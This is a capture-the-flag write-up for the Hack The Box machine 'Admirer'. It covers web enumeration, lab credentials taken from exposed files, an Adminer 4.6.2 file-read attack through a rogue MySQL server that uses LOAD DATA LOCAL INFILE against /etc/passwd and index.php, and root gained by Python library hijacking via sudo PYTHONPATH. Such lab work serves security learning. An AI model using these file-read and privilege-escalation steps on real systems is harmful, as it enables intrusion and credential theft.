# Admirer

### Basic Information
**Machine name:** Admirer  
**IP:** 10.10.10.187  
**Written by:** Adir Biran  
**Tools:** Nmap, Gobuster, MySQL
**Method:** 



## Enumeration
#### Nmap

<p align="center">
<img width="407" alt="1" src="https://user-images.githubusercontent.com/21021400/144714127-5b30817e-0a81-4b01-8378-8c16b56f4be8.png">
</p>

Open ports:  
21 - FTP  
22 - SSH  
80 - HTTP  

#### Gobuster

<p align="center">
<img width="369" alt="2" src="https://user-images.githubusercontent.com/21021400/144714128-32be6f03-dca4-4783-abc9-94217c20c3d9.png">
</p>

Two endpoints found:  
/images  
/assets  

Website:  
<p align="center">
<img width="960" alt="2-5" src="https://user-images.githubusercontent.com/21021400/144714130-a06f0e36-8518-4458-9f2c-0e3b012239ed.png">
</p>

robots.txt file:  
<p align="center">
<img width="392" alt="3" src="https://user-images.githubusercontent.com/21021400/144714131-386cb29f-112a-4830-912d-d23d23c3bfd3.png">
</p>

On the robots file found a user (waldo) and another endpoint: /admin-dir  

/admin-dir:  
<p align="center">
<img width="360" alt="4" src="https://user-images.githubusercontent.com/21021400/144714132-8003f7dd-a81a-4794-b2d2-a580658fb9d3.png">
</p>

Gobuster on admin-dir  
<p align="center">
<img width="432" alt="5" src="https://user-images.githubusercontent.com/21021400/144714133-10765f7e-4fda-405b-ba5a-af91d0aff219.png">
</p>

2 Files were found inside admin-dir:  
contacts.txt  
credentials.txt  

admin-dir/contacts.txt  
<p align="center">
<img width="283" alt="6" src="https://user-images.githubusercontent.com/21021400/144714135-c13edb35-e633-477a-ad06-2eac87da5bb7.png">
</p>

admin-dir/credentials.txt  
<p align="center">
<img width="291" alt="7" src="https://user-images.githubusercontent.com/21021400/144714136-6b797dba-0b3d-478a-83a8-8de986d4d336.png">
</p>

Credentials retrieved:  
w.cooper@admirer.htb:fgJr6q#S\W:$P (Mail)  
ftpuser:%n?4Wz}R$tTF7 (FTP)  
admin:w0rdpr3ss01! (Wordpress)  

#### FTP

FTP login as ftpuser  
<p align="center">
<img width="276" alt="8" src="https://user-images.githubusercontent.com/21021400/144714137-19ce3271-e978-4649-9f01-fcf527fad65e.png">
</p>

Get the files:  
<p align="center">
<img width="297" alt="9" src="https://user-images.githubusercontent.com/21021400/144714138-b9d42dea-8d23-45b7-9db5-c19a566d1ae3.png">
</p>

dump.sql  
<p align="center">
<img width="342" alt="10" src="https://user-images.githubusercontent.com/21021400/144714141-d46be68c-047b-4ac4-9f1d-5a266c646e27.png">
</p>

Database name is admirerdb and the type is mariadb 10.1.41.  

Untar the html.tar.gz file:  
tar -zxvf html.tar.gz  

Files after extraction:  
<p align="center">
<img width="269" alt="11" src="https://user-images.githubusercontent.com/21021400/144714142-6ffe198b-5cca-433e-a99c-914faaf1cb83.png">
</p>

index.php file  
<p align="center">
<img width="549" alt="12" src="https://user-images.githubusercontent.com/21021400/144714143-1c131108-a119-4f52-955c-4ec67871ab0e.png">
</p>

Credentials found:  
waldo:]F7jLHw:*G>UPrTo}~A"d6b  

waldo_secret_dir  
<p align="center">
<img width="243" alt="13" src="https://user-images.githubusercontent.com/21021400/144714144-8a91d858-21e1-4599-bae3-661cc31b3449.png">
</p>

utility-scripts  
<p align="center">
<img width="250" alt="14" src="https://user-images.githubusercontent.com/21021400/144714145-5d364797-e9cf-47fa-af1e-53b29be32d4d.png">
</p>

utility-scripts/admin_tasks.php  
<p align="center">
<img width="384" alt="15" src="https://user-images.githubusercontent.com/21021400/144714146-5c4f6c4c-1292-4b29-b3b9-b36583b978f1.png">
</p>

utility-scripts/db_admin.php  
<p align="center">
<img width="326" alt="16" src="https://user-images.githubusercontent.com/21021400/144714147-1889bcfb-11c5-4a72-a22d-098992b98cc9.png">
</p>

Credentials found:  
waldo:Wh3r3_1s_w4ld0?  
In addition to that, an interesting comment about other open source implementation.  

utility-scripts/info.php  
<p align="center">
<img width="181" alt="17" src="https://user-images.githubusercontent.com/21021400/144714149-baab485d-31a8-4238-95c0-aa37382743b9.png">
</p>

utility-scripts/phptest.php  
<p align="center">
<img width="177" alt="18" src="https://user-images.githubusercontent.com/21021400/144714152-2f41cfdf-95a9-4534-b8a6-96ff09a5e2ef.png">
</p>

Navigating to utility-scripts:  
<p align="center">
<img width="272" alt="19" src="https://user-images.githubusercontent.com/21021400/144714153-190ebdc8-5004-46e4-8929-7a35d64d6e02.png">
</p>

Navigating to utility-scripts/info.php  
<p align="center">
<img width="718" alt="20" src="https://user-images.githubusercontent.com/21021400/144714154-ad013728-ace6-47b7-9025-5e31f03a0c4f.png">
</p>

Navigating to utility-scripts/admin_tasks.php  
<p align="center">
<img width="315" alt="21" src="https://user-images.githubusercontent.com/21021400/144714164-aa0df5d4-4ef8-4ba9-bad9-347c4e4c76f0.png">
</p>

A few options but nothing useful yet.  

After seeing the comment about open source implementation, a search on google lead to adminer (previously phpMinAdmin) and its login page.  
https://linuxconfig.org/using-adminer-to-manage-your-databases  
<p align="center">
<img width="713" alt="22" src="https://user-images.githubusercontent.com/21021400/144714167-f897f8b2-0e7c-4935-aa06-f48394e2bf5a.png">
</p>

Navigating to utility-scripts/adminer.php  
<p align="center">
<img width="349" alt="23" src="https://user-images.githubusercontent.com/21021400/144714168-74401ce4-3d22-4dc0-bc7a-335a3a614241.png">
</p>

Tried all the credentials retrieved so far, nothing worked though.  
<p align="center">
<img width="436" alt="24" src="https://user-images.githubusercontent.com/21021400/144714169-62d88415-80de-463f-b266-0adc81bae17b.png">
</p>

Adminer version is 4.6.2  

## Exploitation

A search on google lead to this article about file disclosure vulnerability:  
https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/  
<p align="center">
<img width="584" alt="25" src="https://user-images.githubusercontent.com/21021400/144714171-039e81bf-33c8-47da-8e49-6f5000d5a650.png">
</p>

Looking further for technical details for arbirary file read in adminer 4.6.2, found this article:  
https://podalirius.net/en/cves/2021-xxxxx/  

For that exploit to work, we need to create a SQL database on our local machine, connect to it from the admirer's login page and read files on the server.  

On the local machine, start the mysql service:  
<p align="center">
<img width="133" alt="26" src="https://user-images.githubusercontent.com/21021400/144714173-3a00d2b1-e7b9-448c-801c-141ab5fd096b.png">
</p>
sudo systemctl start mysql  

Connect to sql:  
<p align="center">
<img width="320" alt="27" src="https://user-images.githubusercontent.com/21021400/144714175-0c763da5-4d45-4b05-ac36-bbeac308fbd8.png">
</p>
mysql -u root -p  

Create the admirer database:  
<p align="center">
<img width="185" alt="28" src="https://user-images.githubusercontent.com/21021400/144714176-a2bb05b6-591a-429e-a701-fdf403c8925d.png">
</p>
CREATE DATABASE admirer;  

Use the admirer database:  
<p align="center">
<img width="129" alt="29" src="https://user-images.githubusercontent.com/21021400/144714177-126deea6-1260-49a5-82f1-86dbd1653131.png">
</p>
USE admirer;  

Create a table:  
<p align="center">
<img width="259" alt="30" src="https://user-images.githubusercontent.com/21021400/144714178-3bc57a5c-4a29-4dc4-93f4-4e9a0cabd85e.png">
</p>
CREATE TABLE getfile(content varchar(256));  

Allow access from the admirer machine:  
<p align="center">
<img width="366" alt="31" src="https://user-images.githubusercontent.com/21021400/144714179-f9dc368f-8244-4bfa-a3de-a3ab960e6af9.png">
</p>
GRANT ALL PRIVILEGES ON *.* TO root@10.10.10.187 IDENTIFIED BY 'toor';  

Last thing, is accepting connections remotely.  
edit the file /etc/mysql/mariadb.conf.d/50-server.cnf and set bind-address = 0.0.0.0  
<p align="center">
<img width="150" alt="32" src="https://user-images.githubusercontent.com/21021400/144714156-d0f87f7a-4bb7-4c0d-a634-fc44dd8620d5.png">
</p>

Restart the mysql service:  
systemctl restart mysql  

Login using the local machine's IP, credentials for db and db's name created previously.  
<p align="center">
<img width="170" alt="33" src="https://user-images.githubusercontent.com/21021400/144714157-e7cfa64d-14ed-4fca-b7fa-0395a778c9c3.png">
</p>

and we're in.  

<p align="center">
<img width="534" alt="34" src="https://user-images.githubusercontent.com/21021400/144714158-23d21294-c53a-4c6c-a7a4-200367814ff4.png">
</p>

Navigating to the SQL Command button on the top left and executing the following command to read /etc/passwd as a POC:  
<p align="center">
<img width="336" alt="35" src="https://user-images.githubusercontent.com/21021400/144714159-153355b2-4193-4ae9-8ed8-2392dba65a5c.png">
</p>
LOAD DATA local INFILE '/etc/passwd' INTO TABLE getfile fields TERMINATED BY "\n";  

Failed.

Try to read the index.php file of the website (currently we're in /utility-scripts):  
<p align="center">
<img width="311" alt="36" src="https://user-images.githubusercontent.com/21021400/144714160-86af1026-f922-4635-9d87-cfadeea5ef4b.png">
</p>
LOAD DATA local INFILE '../index.php' INTO TABLE getfile fields TERMINATED BY "\n";  

It worked.  

Then, read the content of index.php by selecting getfile table created earlier:  
<p align="center">
<img width="632" alt="37" src="https://user-images.githubusercontent.com/21021400/144714162-f370f3e4-cad4-4bb3-9658-c5d857bb5f81.png">
</p>
SELECT * FROM getfile;  

Found another password for waldo:  
waldo:&<h5b~yK3F#{PaPB&dA}{H>  

Trying to connect to the machine through SSH with those credentials:  
<p align="center">
<img width="301" alt="38" src="https://user-images.githubusercontent.com/21021400/144714180-b06977a8-3e8d-4b1f-8616-2c7505140ab7.png">
</p>

## Privilege Escalation (waldo -> root)

sudo -l
<p align="center">
<img width="390" alt="39" src="https://user-images.githubusercontent.com/21021400/144714181-af070e49-5499-404c-b12e-f89cb667361c.png">
</p>

Looks like we can /opt/scripts/admin_tasks.sh as sudo.  
Let's see what's inside this directory.  
<p align="center">
<img width="232" alt="40" src="https://user-images.githubusercontent.com/21021400/144714182-3647c484-0f61-4544-a803-8aa2f852ae48.png">
</p>

admin_tasks.sh allows for multiple commands depends on the input.  
Let's try to run it.  
<p align="center">
<img width="238" alt="41" src="https://user-images.githubusercontent.com/21021400/144714183-5ebdced8-95d3-46cf-85e7-dc4a36737e41.png">
</p>

Command #4 backups the passwd file, as we can see, we don't have privileges for that operation.  

Lets try with sudo:  
<p align="center">
<img width="218" alt="42" src="https://user-images.githubusercontent.com/21021400/144714185-e06ba58e-4e00-4dd9-af4b-23c5fd1331c2.png">
</p>

Checking the backup.py file:  
<p align="center">
<img width="178" alt="43" src="https://user-images.githubusercontent.com/21021400/144714186-bf767215-9a7b-457e-a9ac-4cc8279adf5b.png">
</p>

The backup.py file is executed when command #6 is passwd to the admin_tasks.sh file.  

<p align="center">
<img width="325" alt="44" src="https://user-images.githubusercontent.com/21021400/144714187-4b42491c-a128-4534-bd3f-3a48e139e22e.png">
</p>

We can try library hijacking, by creating a shutil.py file with make_archive function, and pass its' location with PYTHONPASS.  
As found in this page, a way to run sudo with environment variable inline.  
https://askubuntu.com/questions/57915/environment-variables-when-run-with-sudo  

First, lets create the shutil.py file in /tmp:  
<p align="center">
<img width="173" alt="45" src="https://user-images.githubusercontent.com/21021400/144714188-d5881f81-a843-4c35-8ee0-4e41e1a96402.png">
</p>

When we will run admin_tasks.sh as sudo with #6 command, the backup.py file will be executed.  
Once executed, it will look for make_archive function from shutil.py that we located in /tmp, which will result in adding SUID to /bin/bash.  

Lhe last step is running the admin_tasks.sh as sudo with #6 and passing /tmp directory as PYTHONPATH:  
<p align="center">
<img width="265" alt="46" src="https://user-images.githubusercontent.com/21021400/144714189-a873eff9-55b9-42c4-99b3-9ad7d13f1200.png">
</p>
sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6  

Checking the /bin/bash permissions to see if it worked:  
<p align="center">
<img width="222" alt="47" src="https://user-images.githubusercontent.com/21021400/144714190-54a9f88b-098b-46d0-b3b7-097aef40c43b.png">
</p>

Run bash with -p tag to get a root shell:  

<p align="center">
<img width="78" alt="48" src="https://user-images.githubusercontent.com/21021400/144714192-60e574bc-422d-4c81-9212-4f58b3143ea6.png">
</p>

and we're root.
